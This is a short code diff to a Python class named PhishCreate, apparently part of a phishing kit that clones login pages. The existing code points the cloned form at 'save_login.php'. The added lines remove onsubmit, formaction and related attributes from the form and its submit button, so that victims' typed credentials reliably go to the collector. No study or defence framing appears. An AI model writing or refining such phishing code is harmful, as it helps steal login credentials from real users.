@@ -159,6 +159,19 @@ class PhishCreate:
         if form:
             form['action'] = "save_login.php"
             form['method'] = "post"
+
+            for attr in ["onsubmit", "formaction", "formmethod", "formenctype", "formnovalidate"]:
+                form.attrs.pop(attr, None)
+            
+            submit_btn = form.find('button', type="submit") or form.find('input', type="submit")
+            if submit_btn:
+                submit_btn.attrs.pop("formaction", None)
+                submit_btn.attrs.pop("formmethod", None)
+                submit_btn.attrs.pop("formenctype", None)
+                submit_btn.attrs.pop("formnovalidate", None)
+                if "name" in submit_btn.attrs and submit_btn["name"].lower() == "submit":
+                    submit_btn.attrs.pop("name")
+
             
         with open(file_path, 'w', encoding='utf-8') as file:
             file.write(str(soup))
